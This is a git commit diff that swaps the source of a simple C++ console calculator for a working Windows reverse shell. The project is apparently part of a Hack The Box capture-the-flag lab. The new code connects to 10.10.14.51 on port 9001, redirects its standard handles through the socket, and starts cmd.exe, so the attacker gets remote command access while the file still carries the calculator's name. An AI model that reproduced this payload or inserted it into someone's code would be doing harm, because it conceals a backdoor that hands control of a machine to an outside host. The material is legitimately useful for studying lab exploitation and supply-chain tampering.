fa4ed20fbaa2e080c86dab1c24d10ae7da54eb7a
kali <kali@kalioscp>
2024-07-28 11:59:20 +0100

    Changes

--- Calculator/main.cpp
+++ Calculator/main.cpp
@@ -1,40 +1,43 @@
-// Created by Richard Goodman (contact me at richard@compiled.htb)
-
-#include <iostream>
-#include <cmath>
+#include <winsock2.h>
+#include <stdio.h>
+#pragma comment(lib,"ws2_32")
 
 using namespace std;
 
+WSADATA wsaData;
+SOCKET Winsock;
+struct sockaddr_in hax;
+char ip_addr[16] = "10.10.14.51";
+char port[6] = "9001";
+
+STARTUPINFO ini_processo;
+
+PROCESS_INFORMATION processo_info;
+
 int main()
 {
-	// Variables
-	string operation;
-	double number1, number2;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
-	// Input
-	cout << "Enter first number: ";
-	cin >> number1;
-	cout << "Enter operation (+, -, *, /): ";
-	cin >> operation;
-	cout << "Enter second number: ";
-	cin >> number2;
 
-	// if else statement checking entered operation
-	if (operation == "+") {
-		cout << number1 + number2;
-	}
-	else if (operation == "-") {
-		cout << number1 - number2;
-	}
-	else if (operation == "*") {
-		cout << number1 * number2;
-	}
-	else if (operation == "/") {
-		cout << number1 / number2;
-	}
-	else {
-		cout << "Not recognized either operation or number:(";
-	}
+    struct hostent *host;
+    host = gethostbyname(ip_addr);
+    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));
 
-	return 0;
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(atoi(port));
+    hax.sin_addr.s_addr = inet_addr(ip_addr);
+
+    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+    memset(&ini_processo, 0, sizeof(ini_processo));
+    ini_processo.cb = sizeof(ini_processo);
+    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+
+    TCHAR cmd[255] = TEXT("cmd.exe");
+
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+
+    return 0;
 }
